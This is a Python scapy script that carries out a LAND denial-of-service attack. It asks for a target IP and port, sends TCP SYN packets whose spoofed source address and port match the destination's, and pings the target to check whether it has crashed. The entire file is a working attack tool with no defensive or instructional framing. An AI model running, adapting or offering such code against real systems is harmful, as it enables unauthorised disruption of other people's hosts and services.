import scapy.all as scapy

"""
 Requires being run as ROOT/administrator. 
"""
TARGET = input("IP address of target: ")
PORT = int(input("Port number to target: "))


def craft():
    return scapy.IP(src=TARGET, dst=TARGET)/scapy.TCP(sport=PORT, dport=PORT, flags="S")


def ping(destination):
    packet = scapy.IP(dst=destination, )/scapy.ICMP()
    result = scapy.sr1(packet, timeout=5)
    return False if result is None else True


print("Pinging target")
up = ping(TARGET)
if up:
    # Craft packet.
    payload = craft()
    # Send payload.
    down = False
    attempts = 3
    while not down and attempts != 0:
        attempts-=1
        print("Target is up. Sending payload.")
        scapy.send(payload)
        print("Pinging target...")
        up = ping(TARGET)
        if not up:
            print("Target not responding. Assuming its vulnerable and down.")
            down = True
    if attempts == 0:
        print("Target did not go down. It's either running Windows NT 4 or isn't vulnerable.")
else:
    print("Host is already down. Check the IP?")

print("Finished.")
